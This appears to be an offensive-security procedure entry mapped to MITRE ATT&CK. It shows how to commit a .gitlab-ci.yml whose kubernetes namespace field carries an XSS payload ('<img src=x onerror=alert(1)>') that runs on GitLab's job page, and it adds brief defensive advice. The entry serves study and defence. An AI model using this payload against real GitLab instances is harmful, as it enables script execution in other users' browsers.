---
tags:
  - xss
  - payload-injection
  - cicd
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.262Z'
sub_techniques: []
id: 2597232a-6363-43e7-a0dc-ff8262e552d9
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-in-GitLab-CI-YML

## Summary

This procedure commits a specially crafted .gitlab-ci.yml file to the GitLab repository, embedding an XSS payload in the kubernetes: namespace field to exploit the lack of sanitization in the job page rendering.

## Description

The YAML defines a simple deploy stage and job that references the malicious namespace '<img src=x onerror=alert(1)>'. When the pipeline runs, this value is stored and later interpolated unsafely into the Vue.js component (environments_block.vue), triggering JavaScript execution.

## Requirements

1. GitLab project with master branch
2. Write access to the repository
3. Knowledge of YAML syntax for CI configuration

## Defense

Defensive measures and detection strategies:

- Sanitize all user-supplied values in CI YAML before rendering (e.g., HTML-escape namespaces)
- Scan commits for suspicious scripts in CI files
- Use GitLab's CI linting to validate configurations

## Objectives

1. Store the XSS payload in the CI configuration
2. Trigger an initial pipeline to process the YAML
3. Set up for exploitation on job view

## Instructions

### Step 1: Create .gitlab-ci.yml File

**Context**: Define the job with the payload in the repository editor.

**Instructions**: In GitLab UI, go to Repository > Files > New file, name it ".gitlab-ci.yml", add content:

```yaml
stages:
  - deploy

deploy:
  stage: deploy
  script:
    - echo 'Deploying'
  environment:
    name: production
  kubernetes:
    namespace: '<img src=x onerror=alert(1)>'
  only:
    - master
```

### Step 2: Commit the File

**Context**: Push the configuration to trigger processing.

**Instructions**: Add commit message (e.g., "Add deploy job"), select master branch, and commit.

> Expected output: File added, pipeline may start automatically.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- payload-injection
- cicd
